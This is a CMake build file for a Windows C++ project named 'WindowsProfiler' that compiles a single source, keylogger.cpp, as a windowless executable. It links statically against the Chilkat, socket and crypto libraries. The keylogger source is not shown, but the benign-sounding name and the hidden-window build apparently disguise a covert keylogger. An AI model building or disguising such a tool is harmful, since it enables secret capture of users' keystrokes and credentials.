cmake_minimum_required(VERSION 3.10)
project(WindowsProfiler)
set(CMAKE_CXX_STANDARD 17)

link_directories(chilkat)
include_directories(chilkat/include)
add_executable(WindowsProfiler WIN32 keylogger.cpp)
#add_executable(WindowsProfiler keylogger.cpp)
target_link_libraries(WindowsProfiler -static chilkat-9.5.0 ws2_32 crypt32 -static-libgcc -static-libstdc++ winpthread)
